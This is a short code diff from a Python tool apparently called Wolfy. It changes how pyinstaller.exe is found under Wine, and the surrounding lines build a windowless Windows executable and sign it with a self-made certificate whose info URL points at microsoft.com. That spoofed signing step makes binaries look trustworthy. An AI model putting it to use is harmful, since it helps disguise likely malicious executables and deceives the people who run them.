@@ -76,7 +76,7 @@ class Wolfy:
         f_build.close()
 
         print("[] - Run the following command and type enter when done.")
-        print(f'sudo wine "$(which pyinstaller.exe)" --onefile --noconsole --distpath {os.getcwd()}/ -i {os.getcwd()}/{icon} -n "{exename}" {os.getcwd()}/build/{exename}.py')
+        print(f'sudo wine "$(find ~/.wine/drive_c/ -type f -name pyinstaller.exe)" --onefile --noconsole --distpath {os.getcwd()}/ -i {os.getcwd()}/{icon} -n "{exename}" {os.getcwd()}/build/{exename}.py')
         input()
         subprocess.call(f'mv "{exename}.exe" "{exename}-not-signed.exe";osslsigncode sign -certs certificate/cert.pem -key certificate/cert.key -n "{exename}" -i https://microsoft.com/ -in "{exename}-not-signed.exe" -out "{exename}.exe";rm "{exename}-not-signed.exe"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
